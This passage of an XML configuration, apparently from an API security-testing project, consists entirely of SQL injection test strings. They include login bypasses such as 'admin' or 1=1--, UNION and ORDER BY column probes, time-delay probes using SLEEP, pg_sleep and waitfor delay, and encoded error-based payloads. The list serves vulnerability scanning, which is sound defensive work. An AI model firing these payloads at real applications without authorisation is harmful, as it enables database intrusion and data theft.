@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#</con:sqlInjectionStrings><con:sqlInjectionStrings>" or true--</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 1=1</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>')) or sleep(5)='</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#</con:sqlInjectionStrings><con:sqlInjectionStrings>' or sleep(5)#</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 1=0</con:sqlInjectionStrings><con:sqlInjectionStrings>;waitfor delay '0:0:5'--</con:sqlInjectionStrings><con:sqlInjectionStrings>;%00</con:sqlInjectionStrings><con:sqlInjectionStrings>admin' or 1=1--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 25-- </con:sqlInjectionStrings><con:sqlInjectionStrings>admin" or "1"="1"/*</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1-- </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8--</con:sqlInjectionStrings><con:sqlInjectionStrings>admin" or "1"="1</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9--</con:sqlInjectionStrings><con:sqlInjectionStrings>IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24</con:sqlInjectionStrings><con:sqlInjectionStrings>") or pg_sleep(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#</con:sqlInjectionStrings><con:sqlInjectionStrings>" or ""*"</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 18# </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 4# </con:sqlInjectionStrings><con:sqlInjectionStrings>')) or pg_sleep(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 16 </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 13-- </con:sqlInjectionStrings><con:sqlInjectionStrings>" or "" "</con:sqlInjectionStrings><con:sqlInjectionStrings>");waitfor delay '0:0:5'--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5)</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24</con:sqlInjectionStrings><con:sqlInjectionStrings>AS INJECTX WHERE 1=1 AND 1=0--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1 </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY SLEEP(5)</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5</con:sqlInjectionStrings><con:sqlInjectionStrings>"^"</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 17 </con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 2 </con:sqlInjectionStrings><con:sqlInjectionStrings>1) or pg_sleep(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#</con:sqlInjectionStrings><con:sqlInjectionStrings>admin") or "1"="1</con:sqlInjectionStrings><con:sqlInjectionStrings>AnD SLEEP(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 18 </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#</con:sqlInjectionStrings><con:sqlInjectionStrings>' or ''^'</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT USER(),SLEEP(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>SLEEP(5)#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 20# </con:sqlInjectionStrings><con:sqlInjectionStrings>(SELECT * FROM (SELECT(SLEEP(5)))ecMj)</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT NULL</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 3 </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#</con:sqlInjectionStrings><con:sqlInjectionStrings>or benchmark(50000000,MD5(1))#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#</con:sqlInjectionStrings><con:sqlInjectionStrings>'%20o/**/r%201/0%20--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 19 </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),3--</con:sqlInjectionStrings><con:sqlInjectionStrings>admin') or '1'='1'--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY SLEEP(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>" or sleep(5)#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 8-- </con:sqlInjectionStrings><con:sqlInjectionStrings>&amp;&amp;SLEEP(5)#</con:sqlInjectionStrings><con:sqlInjectionStrings>admin") or "1"="1"#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 6# </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10</con:sqlInjectionStrings><con:sqlInjectionStrings>") or true--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 4 </con:sqlInjectionStrings><con:sqlInjectionStrings>waitfor delay '00:00:05'</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4#</con:sqlInjectionStrings><con:sqlInjectionStrings>\\</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16</con:sqlInjectionStrings><con:sqlInjectionStrings>%' AND 8310=8311 AND '%'='</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 12 </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 23-- </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#</con:sqlInjectionStrings><con:sqlInjectionStrings>' AND id IS NULL; --</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 5 </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 13 </con:sqlInjectionStrings><con:sqlInjectionStrings>" "</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--</con:sqlInjectionStrings><con:sqlInjectionStrings>%' AND 8310=8310 AND '%'='</con:sqlInjectionStrings><con:sqlInjectionStrings>SLEEP(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#</con:sqlInjectionStrings><con:sqlInjectionStrings>AS INJECTX WHERE 1=1 AND 1=1</con:sqlInjectionStrings><con:sqlInjectionStrings>AS INJECTX WHERE 1=1 AND 1=0</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 1</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))#</con:sqlInjectionStrings><con:sqlInjectionStrings>admin" or 1=1</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 6 </con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 0</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 14 </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 8 </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 11-- </con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12--</con:sqlInjectionStrings><con:sqlInjectionStrings>') or ('x')=('x</con:sqlInjectionStrings><con:sqlInjectionStrings>'''''''''''''UNION SELECT '2</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17#</con:sqlInjectionStrings><con:sqlInjectionStrings>or pg_SLEEP(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>1) or benchmark(10000000,MD5(1))#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 7 </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 15 </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 9 </con:sqlInjectionStrings><con:sqlInjectionStrings>1-true</con:sqlInjectionStrings><con:sqlInjectionStrings>AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--</con:sqlInjectionStrings><con:sqlInjectionStrings>admin' or 1=1</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 8# </con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))--</con:sqlInjectionStrings><con:sqlInjectionStrings>``</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29</con:sqlInjectionStrings><con:sqlInjectionStrings>" or pg_sleep(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 25# </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),4</con:sqlInjectionStrings><con:sqlInjectionStrings>waitfor delay '00:00:05'--</con:sqlInjectionStrings><con:sqlInjectionStrings>' GROUP BY columnnames having 1=1 --</con:sqlInjectionStrings><con:sqlInjectionStrings>@variable</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--</con:sqlInjectionStrings><con:sqlInjectionStrings>SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/</con:sqlInjectionStrings><con:sqlInjectionStrings>or SLEEP(5)</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--</con:sqlInjectionStrings><con:sqlInjectionStrings>admin' or 1=1 or ''='</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9--</con:sqlInjectionStrings><con:sqlInjectionStrings>(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--</con:sqlInjectionStrings><con:sqlInjectionStrings>' OR 'x'='x</con:sqlInjectionStrings><con:sqlInjectionStrings>""</con:sqlInjectionStrings><con:sqlInjectionStrings>SLEEP(5)='</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 1=1-- </con:sqlInjectionStrings><con:sqlInjectionStrings>SLEEP(5)="</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 10 </con:sqlInjectionStrings><con:sqlInjectionStrings>);waitfor delay '0:0:5'--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#</con:sqlInjectionStrings><con:sqlInjectionStrings>or SLEEP(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 21-- </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--</con:sqlInjectionStrings><con:sqlInjectionStrings>OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))</con:sqlInjectionStrings><con:sqlInjectionStrings>") or ("x")=("x</con:sqlInjectionStrings><con:sqlInjectionStrings>"&amp;"</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 5-- </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 11 </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 12# </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#</con:sqlInjectionStrings><con:sqlInjectionStrings>OR x=x-- </con:sqlInjectionStrings><con:sqlInjectionStrings>or 1=1</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--</con:sqlInjectionStrings><con:sqlInjectionStrings>' or 'x'='x</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 23# </con:sqlInjectionStrings><con:sqlInjectionStrings>OR x=y#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 31337 </con:sqlInjectionStrings><con:sqlInjectionStrings>1' ORDER BY 1,2,3--+</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--</con:sqlInjectionStrings><con:sqlInjectionStrings>OR x=x#</con:sqlInjectionStrings><con:sqlInjectionStrings>") or sleep(5)="</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 30 </con:sqlInjectionStrings><con:sqlInjectionStrings>/*!10000%201/0%20*/</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 